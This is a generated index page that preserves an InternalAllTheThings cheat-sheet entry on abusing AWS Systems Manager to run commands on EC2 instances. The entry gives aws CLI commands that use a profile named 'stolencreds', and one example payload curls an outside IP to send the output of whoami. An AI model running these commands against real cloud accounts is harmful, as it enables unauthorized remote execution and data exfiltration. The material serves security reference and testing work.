---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# AWS - Service - SSM

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-cloud-aws-aws-ssm` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/aws/aws-ssm.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [AWS - Service - SSM](../../topics/cloud/aws-service-ssm.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-cloud-aws-aws-ssm |
| name | AWS - Service - SSM |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cloud/aws/aws-ssm.md |

## Preserved Source Material

````yaml
_body: "# AWS - Service - SSM\n\n## Command execution\n\n:warning: The ssm-user account is not removed from the system when\
  \ SSM Agent is uninstalled.\n\nSSM Agent is preinstalled, by default, on the following Amazon Machine Images (AMIs):\n\n\
  * Windows Server 2008-2012 R2 AMIs published in November 2016 or later\n* Windows Server 2016 and 2019\n* Amazon Linux\n\
  * Amazon Linux 2\n* Ubuntu Server 16.04\n* Ubuntu Server 18.04\n* Amazon ECS-Optimized\n\n```powershell\n$ aws ssm describe-instance-information\
  \ --profile stolencreds --region eu-west-1  \n$ aws ssm send-command --instance-ids \"INSTANCE-ID-HERE\" --document-name\
  \ \"AWS-RunShellScript\" --comment \"IP Config\" --parameters commands=ifconfig --output text --query \"Command.CommandId\"\
  \ --profile stolencreds\n$ aws ssm list-command-invocations --command-id \"COMMAND-ID-HERE\" --details --query \"CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}\"\
  \ --profile stolencreds\n\ne.g:\n$ aws ssm send-command --instance-ids \"i-05b████████adaa\" --document-name \"AWS-RunShellScript\"\
  \ --comment \"whoami\" --parameters commands='curl 162.243.███.███:8080/`whoami`' --output text --region=us-east-1\n```\n\
  \n## References\n\n* [What is AWS Systems Manager? - AWS](https://docs.aws.amazon.com/systems-manager/latest/userguide/what-is-systems-manager.html)"
_relative_path: cloud/aws/aws-ssm.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/aws/aws-ssm.md
````
